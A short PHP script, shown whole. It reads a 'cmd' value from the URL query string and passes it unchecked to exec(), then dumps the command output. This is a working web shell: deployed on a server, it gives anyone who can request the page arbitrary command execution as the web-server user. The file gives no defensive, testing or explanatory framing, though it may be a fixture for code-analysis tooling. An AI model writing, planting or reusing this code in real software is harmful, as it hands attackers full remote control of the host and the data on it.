<?php declare(strict_types = 1);

$cmd = $_GET['cmd'] ?? 'whoami';
$ret = exec($cmd, $output);
var_dump($output);
var_dump($ret);
